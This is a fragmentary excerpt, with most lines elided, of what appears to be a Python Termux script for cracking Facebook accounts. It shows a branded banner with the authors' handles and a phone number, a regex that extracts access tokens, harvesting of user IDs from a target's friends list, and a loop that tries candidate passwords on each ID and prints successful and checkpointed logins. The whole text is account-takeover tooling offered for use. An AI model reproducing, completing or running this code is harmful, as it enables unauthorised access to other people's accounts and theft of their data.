...
def banner():
	print("""
\033[0;96m/  ░█████╗░██╗░░░░░██╗    
\033[0;96m/  ██╔══██╗██║░░░░░██║\033[0;96m║ \033[0;97mCoded By \033[0;96mAli \033[0;97m& \033[0;96mRaza
\033[0;96m/  ███████║██║░░░░░██║\033[0;96m║ \033[0;97mFB \033[0;96m: \033[0;97mAr Termux Trick
\033[0;96m/  ██╔══██║██║░░░░░██║\033[0;96m║ \033[0;97mYt \033[0;96m: \033[0;97mTechnical Raza
\033[0;96m/  ██║░░██║███████╗██║\033[0;96m║ \033[0;97mWp \033[0;96m: \033[0;97m03047269778
\033[0;96m─────────────────────────────────────────────────────────────""")
...
def convert():
	...
	try:
		...
		find_token = re.search('(EAAAA\w+)', tomken.text)
...
def publik():
	...
	try:
                ...
                banner()
                print ("\033[0;96m─────────────────────────────────────────────────────────────")
		print("\033[0;96m╔══\033[0;97m[•] Type \'me\' If You Want To Take ID From Own Friends List")
		...
		ys.close()
		print ("\033[0;96m─────────────────────────────────────────────────────────────")
		print ('\033[0;96m╔══\033[0;97m[•] Successfully Cracked ID from %s'%op['name'])
...
def methode():
  ...
  banner()
  print ("\033[0;96m─────────────────────────────────────────────────────────────")
  print("\033[0;96m╔══\033[0;97m[ Select Crack Method ]")
  print("\033[0;96m║")
  ...
  if sek=="":print("\033[0;97m   [!] Correct Content").format(R,N);methode()
    ...
    print("\033[0;97m   [!] Correct Option").format(R,N);methode()
def logs():
  banner()
  print("\033[0;96m─────────────────────────────────────────────────────────────")
  print("\033[0;96m╔══\033[0;97m[ Select Login Method ]")
  print("\033[0;96m║")
  ...
  if sek=="":
    print("\033[0;97m   [!] Correct").format(R,N);logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					print("\r   [ALI/OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					...
					print("\r   [ALI/CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
